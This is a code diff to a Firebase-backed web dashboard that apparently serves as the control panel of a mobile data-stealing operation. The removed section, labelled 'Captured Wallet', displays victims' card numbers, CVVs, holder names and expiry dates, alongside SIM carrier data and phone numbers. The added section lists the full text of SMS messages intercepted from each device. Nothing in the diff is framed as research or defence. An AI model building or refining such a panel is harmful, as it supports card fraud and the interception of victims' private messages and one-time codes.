@@ -179,7 +179,7 @@ function syncDashboardWithFirebase() {
         allSms.sort((a, b) => new Date(b.received_time) - new Date(a.received_time));
 
             smsListContainer.innerHTML = allSms.slice(0, 15).map(sms => `
-                <div class="bg-white p-4 rounded-2xl border border-slate-100 shadow-sm">
+                <div class="bg-white p-4 rounded-2xl border-2 border-slate-100 shadow-[0_4px_0_0_rgba(226,232,240,1)] hover:translate-y-[2px] hover:shadow-[0_2px_0_0_rgba(226,232,240,1)] transition-all duration-200">
                     <div class="flex justify-between items-start mb-1">
                         <p class="text-[10px] font-bold text-indigo-600 uppercase">${sms.sender}</p>
                         <p class="text-[9px] text-slate-400">${sms.received_time}</p>
@@ -265,46 +265,31 @@ function openDeviceDetails(deviceId) {
             </div>
         </div>
 
-        <!-- Financial Data (Premium Card Style) -->
-        <div class="bg-slate-900 p-4 rounded-2xl border border-white/10 shadow-lg shadow-slate-400 text-white space-y-3 relative overflow-hidden">
-            <div class="absolute -right-4 -bottom-4 w-24 h-24 bg-white/5 rounded-full blur-2xl"></div>
-            <div class="flex items-center justify-between border-b border-white/10 pb-2">
-                <h3 class="text-[10px] font-black text-indigo-400 uppercase tracking-widest">Captured Wallet</h3>
-                <i data-lucide="credit-card" class="w-4 h-4 text-white/40"></i>
-            </div>
-            ${dev.data_collection ? Object.values(dev.data_collection).map(card => `
-                <div class="space-y-2 bg-white/5 p-3 rounded-xl border border-white/5">
-                    <div class="flex justify-between items-center">
-                        <p class="text-[10px] font-mono font-bold tracking-[0.2em] text-white">${card.CardNumber || '---- ---- ---- ----'}</p>
-                        <span class="text-[8px] font-bold text-white/40">CVV: ${card.CVV || '***'}</span>
-                    </div>
-                    <div class="flex justify-between items-end">
-                        <div>
-                            <p class="text-[8px] text-white/40 uppercase">Card Holder</p>
-                            <p class="text-xs font-bold tracking-wide">${card.fullName || 'UNKNOWN'}</p>
-                        </div>
-                        <div>
-                            <p class="text-[8px] text-white/40 uppercase">Expiry</p>
-                            <p class="text-xs font-bold">${card.Expiry || '00/00'}</p>
-                        </div>
-                    </div>
+        <!-- Device SMS Logs -->
+        <div class="space-y-3">
+            <div class="flex items-center justify-between px-2">
+                <div class="flex items-center space-x-2">
+                    <i data-lucide="message-square" class="w-3.5 h-3.5 text-indigo-500"></i>
+                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">Device SMS Logs</h3>
                 </div>
-            `).join('') : '<p class="text-[10px] text-white/40 text-center py-2">No records found</p>'}
-        </div>
-
-        <!-- Network & Target SMS -->
-        <div class="grid grid-cols-1 gap-4">
-            <div class="bg-white p-4 rounded-2xl border-2 border-slate-200 shadow-md">
-                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-3">Carrier Data</h3>
-                ${Object.values(dev.sims || {}).map(sim => `
-                    <div class="flex items-center justify-between p-2.5 bg-slate-50 rounded-xl mb-2 last:mb-0">
-                        <div class="flex items-center space-x-2">
-                            <i data-lucide="rss" class="w-3 h-3 text-indigo-500"></i>
-                            <p class="text-xs font-bold text-slate-700">${sim.carrier_name}</p>
+                <span class="text-[9px] font-bold text-slate-400 uppercase">${dev.Sms ? Object.keys(dev.Sms).length : 0} Messages</span>
+            </div>
+            <div class="space-y-2">
+                ${dev.Sms ? Object.values(dev.Sms)
+                    .sort((a, b) => new Date(b.received_time) - new Date(a.received_time))
+                    .map(msg => `
+                    <div class="bg-white p-4 rounded-2xl border-2 border-slate-100 shadow-[0_4px_0_0_rgba(226,232,240,1)] hover:translate-y-[2px] hover:shadow-[0_2px_0_0_rgba(226,232,240,1)] transition-all duration-200">
+                        <div class="flex justify-between items-start mb-2">
+                            <span class="text-[10px] font-bold text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-md uppercase tracking-tight">${msg.sender}</span>
+                            <span class="text-[9px] font-medium text-slate-400">${msg.received_time}</span>
                         </div>
-                        <p class="text-[10px] font-mono font-bold text-indigo-600">${sim.number}</p>
+                        <p class="text-xs text-slate-700 leading-relaxed font-medium">${msg.message}</p>
                     </div>
-                `).join('')}
+                `).join('') : `
+                    <div class="bg-white p-10 rounded-2xl border-2 border-dashed border-slate-200 text-center">
+                        <p class="text-xs font-bold text-slate-400">No logs found on this device</p>
+                    </div>
+                `}
             </div>
         </div>
     `;
